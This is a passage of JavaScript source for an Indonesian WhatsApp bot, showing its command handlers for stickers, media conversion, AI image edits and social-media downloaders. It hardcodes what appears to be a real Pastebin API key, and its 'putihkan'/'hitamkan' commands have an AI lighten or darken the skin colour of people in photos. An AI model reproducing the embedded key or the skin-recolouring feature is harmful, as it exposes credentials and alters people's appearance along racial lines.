        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break
case "pestebin": {
 if (!text) return m.reply(`📌 Contoh:\n${cmd} Ini contoh teks yang akan diunggah ke Pastebin`)

  const api_dev_key = 'h9WMT2Mn9QW-qDhvUSc-KObqAYcjI0he' // Ganti dengan API key dari akun Pastebin kamu
  const api_paste_code = text.trim()
  const api_paste_name = `Paste dari ${m.pushName || 'User'}`
  
  const data = new URLSearchParams({
    api_dev_key,
    api_option: 'paste',
    api_paste_code,
    api_paste_name
  })

  try {
    const res = await axios.post('https://pastebin.com/api/api_post.php', data.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    })
    const url = res.data
    if (url.startsWith('Bad API request')) {
      return m.reply('❌ Gagal membuat Pastebin:\n' + url)
    }
    m.reply(`✅ *Berhasil membuat paste:*\n${url}`)
  } catch (e) {
    console.error(e)
    m.reply('⚠️ Gagal mengirim permintaan ke Pastebin.')
  }
}
break
case "getpp": {
let target = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
if (!target) return reply("Reply/@tag target nya")

var ppuser
try {
ppuser = await sock.profilePictureUrl(target, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/ejy4ky.jpg'
}
return sock.sendMessage(m.chat, {image: {url: ppuser}, caption: `Sukses mengambil profil @${target.split("@")[0]}`, mentions: target}, {quoted: m})
}
break
case "iqc": {
if (!text) return m.reply(`Contoh: ${command} kenapa sock ganteng`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://brat.siputzx.my.id/iphone-quoted?time=12.00&batteryPercentage=90&carrierName=AXIS&messageText=${text}&emojiStyle=apple` }, caption: "" }, {quoted: m})
}
break
case "bratvid": {
if (!text) return m.reply(`Contoh: ${command} hai`)
      if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)

      const words = text.split(" ")
      const tempDir = path.join(process.cwd(), 'cache')
      if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
      const framePaths = []
        for (let i = 0; i < words.length; i++) {
          const currentText = words.slice(0, i + 1).join(" ")

          const res = await axios.get(
            `https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, {
              responseType: "arraybuffer"
            }
          ).catch((e) => e.response)

          const framePath = path.join(tempDir, `frame${i}.mp4`)
          fs.writeFileSync(framePath, res.data)
          framePaths.push(framePath)
        }

        const fileListPath = path.join(tempDir, "filelist.txt")
        let fileListContent = ""

        for (let i = 0; i < framePaths.length; i++) {
          fileListContent += `file '${framePaths[i]}'\n`
          fileListContent += `duration 0.5\n`
        }

        fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
        fileListContent += `duration 1.5\n`

        fs.writeFileSync(fileListPath, fileListContent)
        const outputVideoPath = path.join(tempDir, "output.mp4")

        execSync(
          `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset superfast -pix_fmt yuv420p ${outputVideoPath}`
        )

        await sock.sendImageAsSticker(m.chat, outputVideoPath, m, {
          packname: namaBot,
          author: namaBot,
          contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
        })

        framePaths.forEach((frame) => {
          if (fs.existsSync(frame)) fs.unlinkSync(frame)
        })
        if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
        if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
}
break
case "brat": {
if (!text) return m.reply(`Contoh: ${cmd} hai`)
      if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)
      
      await sock.sendImageAsSticker(m.chat, `https://aqul-brat.hf.space/?text=${encodeURIComponent(text)}`, m, {
        packname: ".",
        author: ".",
        contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
      })
}
break
case 'hd':
case 'tohd':
case 'remini': {
  if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${cmd}`)
reply("Tunggu sebentar...")
let media = await sock.downloadAndSaveMediaMessage(quoted);
let response = await CatBox(media);
  await sock.sendMessage(m.chat, {image: {url: `https://api.zenzxz.my.id/tools/upscalev2?url=${response}&scale=4` }, caption: "" }, {quoted: m})
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {
await sock.sendMessage(m.chat, {react: {text: '🚀', key: m.key}})
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return m.reply(`Usage: ${cmd} text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await sock.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
memek = await sock.sendImageAsSticker(m.chat,
 meme, m, {
 packname: `Whatsapp Bot ${namaOwner}`,
 contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
 })
} else {
m.reply(`Kirim/Balas Gambar Dengan Caption ${cmd} text1|text2`)
}
}
break
case 'stickerwm':
case 'wm':
case 'stikerwm':
case 'swm': {
if (!text) return reply("Text Nya mana?")
if (!/image|video/gi.test(mime)) return m.reply("dengan kirim media")
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendImageAsSticker(m.chat,
 image, m, {
 packname: text,
 contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
 })
await fs.unlinkSync(image)
sock.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}

break
case 'toimage': case 'toimg': {
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) return reply(`Balas sticker dengan caption *${cmd}*`)
let media = await sock.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
sock.sendMessage(m.chat, { image: buffer }, {quoted:m})
fs.unlinkSync(ran)
})
}

break 
case 'tovn': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply video/audio dengan caption ${cmd}`)
if (!quoted) return reply(`Reply video/audio dengan caption ${cmd}`)
//await loading()
var dl = await m.quoted.download()
sock.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: m })
}
break
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply video/audio dengan caption ${cmd}`)
if (!quoted) return reply(`Reply video/audio dengan caption ${cmd}`)
//await loading()
var dl = await m.quoted.download()
sock.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: m })
}
break
case "tourl": { 
    if (!/image/.test(mime)) return m.reply("kirim/reply fotonya!");
    const { ImageUploadService } = require('node-upload-images');
    try {
        let mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
        const service = new ImageUploadService('pixhost.to');
  let buffer = fs.readFileSync(mediaPath);
  let { directLink } = await service.uploadFromBinary(buffer, 'jarroffc.png');
  await sock.sendMessage(m.chat, { text: directLink }, { quoted: m });
        await fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error("Tourl Error:", err);
        m.reply("Terjadi kesalahan saat mengubah media menjadi URL.");
    }
}
break;

case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return reply("Kirim foto nya!")
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
var media = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendImageAsSticker(m.chat,
 media, m, {
 packname: `Whatsapp Bot ${namaOwner}`,
 contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
 })
await fs.unlinkSync(media)
}
break
case "idch":
case "cekidch": {
if (!text) return m.reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
await sock.sendMessage(m.chat, {
    interactiveMessage: {
      title: teks,
      footer: "© "+namaBot,
      thumbnail: thumbnail,
      nativeFlowMessage: {
        messageParamsJson: JSON.stringify({
          limited_time_offer: {
            text: "© "+namaBot,
            url: "t.me/zion209",
            copy_code: `Uptime : ${runtime(process.uptime())}`,
            expiration_time: Date.now() * 999
          },
          bottom_sheet: {
            in_thread_buttons_limit: 2,
            divider_indices: [1, 2, 3, 4, 5, 999],
            list_title: "© "+namaBot,
            button_title: "© "+namaBot
          },
          tap_target_configuration: {
            title: "▸ X ◂",
            description: "bomboclard",
            canonical_url: "https://t.me/sh3nnmine",
            domain: "shop.example.com",
            button_index: 0
          }
        }),
        buttons: [
      {
        "name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID\",\"id\":\"${res.id}\",\"copy_code\":\"${res.id}\"}`

          }
        ]
      }
    }
  },
  { quoted: m });
  }
			break;
			
			/*
			   AI
			*/
			case 'tofigurav3':
case 'tofigurav2':
case 'tofigura': {
    
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Sabar wir!!.. 😇🫵');
 
    let mediaPath = null;
    try {
        mediaPath = await sock.downloadAndSaveMediaMessage(q);
        if (!mediaPath) throw new Error("Gagal mengunduh gambar.");
 
        const imageUrl = await CatBox(mediaPath);
        if (!imageUrl) throw new Error("Gagal mengunggah gambar ke server perantara.");
        
        const apiUrl = `https://api-faa.my.id/faa/${command}?url=${imageUrl}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: m });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;
case 'putihkan':
case 'hitamkan': {
    
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Sabar wir!!.. 😇🫵');
 
    let mediaPath = null;
    try {
        mediaPath = await sock.downloadAndSaveMediaMessage(q);
        if (!mediaPath) throw new Error("Gagal mengunduh gambar.");
 
        const imageUrl = await CatBox(mediaPath);
        if (!imageUrl) throw new Error("Gagal mengunggah gambar ke server perantara.");
        
        const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(imageUrl)}&prompt=${command} warna kulit nya`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: m });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;
case 'edit': {
    
 
    const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`⚠️ _Reply sebuah gambar dengan caption *${cmd}aiedit <prompt>*_\n\nContoh: ${cmd}l ubah jadi anime`);
    }
 
    if (!text) {
        return reply(`⚠️ Masukkan perintah edit (prompt)!\n\nContoh: ${cmd} ubah jadi sketsa pensil`);
    }
 
    reply('Sabar wir!!.. 😇🫵');
 
    let mediaPath = null;
    try {
        mediaPath = await sock.downloadAndSaveMediaMessage(q);
        if (!mediaPath) throw new Error("Gagal mengunduh gambar.");
 
        const imageUrl = await CatBox(mediaPath);
        if (!imageUrl) throw new Error("Gagal mengunggah gambar ke server perantara.");
        
        const apiUrl = `https://api-faa.my.id/faa/editfoto?url=${encodeURIComponent(imageUrl)}&prompt=${encodeURIComponent(text)}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = `Nih wir!! Gacor ga?! 😝🔥\n\n*PROMPT:*\n_"${text}"_`;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: m });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break;
case 'lyrra':
case 'autoai': {
if (!isOwner) return reply(mess.owner)
if (args[0] === 'on') {
        if (setting.autoaigc) return m.reply('Sudah diaktifkan sebelumnya')
        setting.autoaigc = true
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses mengaktifkan ${cmd}`)
      } else if (args[0] === 'off') {
        if (!setting.autoaigc) return m.reply('Sudah dinonaktifkan sebelumnya')
        setting.autoaigc = false
        fs.writeFileSync('./setdb.json', JSON.stringify(setting, null, 2))
        await m.reply(`Sukses menonaktifkan ${cmd}`)
      } else {
        sock.sendMessage(m.chat, {
          text: `Memasuki ${cmd} mode\non -- _mengaktifkan_\noff -- _Menonaktifkan_`,
          caption: '',
          footer: `${namaBot}`,
          buttons: [{
              buttonId: `${cmd} on`,
              buttonText: {
                displayText: `ON`
              }
            },
            {
              buttonId: `${cmd} off`,
              buttonText: {
                displayText: `OFF`
              }
            }
          ],
          viewOnce: true,
          headerType: 6,
        }, {
          quoted: m
        });
      }
    }

break               
case 'lyrraai':
case 'gpt':
case 'openai':
case 'ai': {
if (!text) return reply(`Contoh : ${cmd} Siapa presiden Indonesia`)
      try {
        const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
      loadai(`${data.result}`);
    } else {
      Lyrra(pushname, text);
  }
} catch (e) {
  reply('Terjadi error, coba lagi nanti.');
}

}
break
/*
  DOWNLOAD
*/
async function snck(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/snackvideo?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Gagal mengakses API IGDL:", error);
    throw error;
  }
}
case "snackvideo":
      case "sv":
        {
          if (!text) {
            return reply(`mana link-nya? contoh: ${cmd} https://url/reel/xxx/?igsh=xxx`);
            React()
          }
          let memek = await snck(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await sock.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL.",
                    contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await sock.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " "
                  }, {
                    quoted: m
                  });
                } else {
                  await sock.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await sock.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: m
            });
          }
        }
        break;
//
async function ccdl(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/capcut?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Gagal mengakses API IGDL:", error);
    throw error;
  }
}
case "capcut":
      case "cc":
        {
          if (!text) {
            return reply(`mana link-nya? contoh: ${cmd} https://url/reel/xxx/?igsh=xxx`);
            React()
          }
          let memek = await ccdl(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await sock.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await sock.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " ",
                    contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
                  }, {
                    quoted: m
                  });
                } else {
                  await sock.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await sock.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: m
            });
          }
        }
        break;
//
async function fbdll(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/facebook?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Gagal mengakses API IGDL:", error);
    throw error;
  }
}
case "facebook":
      case "fb":
        {
          if (!text) {
            return reply(`mana link-nya? contoh: ${cmd} https://url/reel/xxx/?igsh=xxx`);
            React()
          }
          let memek = await fbdll(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await sock.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await sock.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: " ",
                    contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
                  }, {
                    quoted: m
                  });
                } else {
                  await sock.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await sock.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: m
            });
          }
        }
        break;
//
async function igdl(query) {
  try {
    const response = await fetch(`https://api.siputzx.my.id/api/d/igdl?url=${query}`);
    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Gagal mengakses API IGDL:", error);
    throw error;
  }
}
case "instagram":
      case "ig":
        {
          if (!text) {
            return reply(`mana link instagram-nya? contoh: ${cmd} https://www.instagram.com/reel/DB8BGCZRKAh/?igsh=eDk1ajRncDV6Mjdh`);
            React()
          }
          let memek = await igdl(text);
          let respon = memek.data;
          if (respon && respon.length > 0) {
            let uniqueUrls = new Set(respon.map(item => item.url));
            try {
              for (let mediaUrl of uniqueUrls) {
                const headResponse = await axios.head(mediaUrl);
                const mimeType = headResponse.headers["content-type"];
                const isImage = /image\/.*/.test(mimeType);
                const isVideo = /video\/.*/.test(mimeType);
                if (isImage) {
                  await sock.sendMessage(m.chat, {
                    image: {
                      url: mediaUrl
                    },
                    caption: "berhasil mendownload gambar dari URL."
                  }, {
                    quoted: m
                  });
                } else if (isVideo || mimeType === "application/octet-stream") {
                  await sock.sendMessage(m.chat, {
                    video: {
                      url: mediaUrl
                    },
                    caption: "乂 *I N S T A G R A M  D O W N L O A D* 乂",
                    contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
thumbnailUrl: thumbnail2, 
renderLargerThumbnail: false, 
mediaType: 1, 
previewType: 1, 
sourceUrl: "", 
}}
                  }, {
                    quoted: m
                  });
                } else {
                  await sock.sendMessage(m.chat, {
                    text: `tipe media tidak didukung: ${mimeType}`
                  }, {
                    quoted: m
                  });
                }
              }
            } catch (error) {
              console.error("Error fetching media type:", error);
              reply(error);
            }
          } else {
            await sock.sendMessage(m.chat, {
              text: "Tidak ditemukan media atau terjadi kesalahan saat mengambil media."
            }, {
              quoted: m
            });
          }
        }
        break;
case "tiktok":
      case "tt":
        {
          let momok = "`𝗧 𝗜 𝗞 𝗧 𝗢 𝗞 - 𝗗 𝗢 𝗪 𝗡 𝗟 𝗢 𝗔 𝗗`";
          if (!text.startsWith("https://")) {
            return reply("url");
          }
          await tiktokDl(q).then(async result => {
            await sock.sendMessage(m.chat, {
              react: {
                text: "🕖",
                key: m.key
              }
            });
            if (!result.status) {
              return reply("Error!");
            }
            if (result.durations == 0 && result.duration == "0 Seconds") {
              let araara = new Array();
              let urutan = 0;
              for (let a of result.data) {
                let imgsc = await prepareWAMessageMedia({
                  image: {
                    url: `${a.url}`
                  }
                }, {
                  upload: sock.waUploadToServer
                });
                await araara.push({
                  header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: `Foto Slide Ke *${urutan += 1}*`,
                    hasMediaAttachment: true,
                    ...imgsc
                  }),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [{
                      name: "cta_url",
                      buttonParamsJson: `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
                    }]
                  })
                });
              }
              const msgii = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                  message: {
                    messageContextInfo: {
                      deviceListMetadata: {},
                      deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                      body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: "*TIKTOK - DOWNLOADER*"
                      }),
                      carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: araara
                      })
                    })
                  }
                }
              }, {
                userJid: m.sender,
                quoted: m
              });
              await sock.relayMessage(m.chat, msgii.message, {
                messageId: msgii.key.id
              });
            } else {
              let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark");
              await sock.sendMessage(m.chat, {
                video: {
                  url: urlVid.url
                },
                caption: momok,
                footer: `\n${namaBot}`,
                buttons: [{
                  buttonId: `.ttaudio ${text}`,
                  buttonText: {
                    displayText: "ᴀᴍʙɪʟ ᴍᴜsɪᴋɴʏᴀ"
                  }
                }],
                viewOnce: true
              }, {
                quoted: m
              });
            }
          }).catch(e => console.log(e));
          await sock.sendMessage(m.chat, {
            react: {
              text: "✅",
              key: m.key
            }
          });
        }
        break;
        // Funcc
        async function tiktokDl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      let data = []

      function formatNumber(integer) {
        let numb = parseInt(integer)
        return Number(numb).toLocaleString().replace(/,/g, '.')
      }

      function formatDate(n, locale = 'en') {
        let d = new Date(n)
        return d.toLocaleDateString(locale, {
          weekday: 'long',
          day: 'numeric',
          month: 'long',
          year: 'numeric',
          hour: 'numeric',
          minute: 'numeric',
          second: 'numeric'
        })
      }

      let domain = 'https://www.tikwm.com/api/';
      let res = await (await axios.post(domain, {}, {
        headers: {
          'Accept': 'application/json, text/javascript, */*; q=0.01',
          'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Origin': 'https://www.tikwm.com',
          'Referer': 'https://www.tikwm.com/',
          'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
          'Sec-Ch-Ua-Mobile': '?1',
          'Sec-Ch-Ua-Platform': 'Android',
          'Sec-Fetch-Dest': 'empty',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Site': 'same-origin',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
          'X-Requested-With': 'XMLHttpRequest'
        },
        params: {
          url: url,
          count: 12,
          cursor: 0,
          web: 1,
          hd: 1
        }
      })).data.data
      if (!res.size) {
        res.images.map(v => {
          data.push({
            type: 'photo',
            url: v
          })
        })
      } else {
        data.push({
          type: 'watermark',
          url: 'https://www.tikwm.com' + res.wmplay,
        }, {
          type: 'nowatermark',
          url: 'https://www.tikwm.com' + res.play,
        }, {
          type: 'nowatermark_hd',
          url: 'https://www.tikwm.com' + res.hdplay
        })
      }
      let json = {
        status: true,
        title: res.title,
        taken_at: formatDate(res.create_time).replace('1970', ''),
        region: res.region,
        id: res.id,
        durations: res.duration,
        duration: res.duration + ' Seconds',
        cover: 'https://www.tikwm.com' + res.cover,
        size_wm: res.wm_size,
        size_nowm: res.size,
        size_nowm_hd: res.x_size,
        data: data,
        music_info: {
          id: res.music_info.id,
          title: res.music_info.title,
          author: res.music_info.author,
          album: res.music_info.album ? res.music_info.album : null,
          url: 'https://www.tikwm.com' + res.music || res.music_info.play
        },
        stats: {
          views: formatNumber(res.play_count),
          likes: formatNumber(res.digg_count),
          comment: formatNumber(res.comment_count),
          share: formatNumber(res.share_count),
          download: formatNumber(res.download_count)
        },
        author: {
          id: res.author.id,
          fullname: res.author.unique_id,
          nickname: res.author.nickname,
          avatar: 'https://www.tikwm.com' + res.author.avatar
        }
      }
      resolve(json)
    } catch (e) {
      reject(e)
    }
  });
}

        //
        case 'audiotiktok':
    case 'tiktokaudio':
    case 'audiott':
    case 'ttaudio': {
      try {
        if (!text) return m.reply(`Contoh: ${cmd} linknya`)
        if (!text.includes('tiktok.com')) return m.reply('Harus berupa link tiktok!')
       
        let jir = await tiktokDl(text)
        if (jir.status && jir.data.length > 0) {
          const nowmVideo = jir.data.find(item => item.type === 'nowatermark')
          if (nowmVideo) {
            let audioq = nowmVideo.url
            return await
            sock.sendMessage(m.chat, {
              audio: {
                url: audioq
              },
              mimetype: 'audio/mpeg',
              contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: `©` +namaBot, 
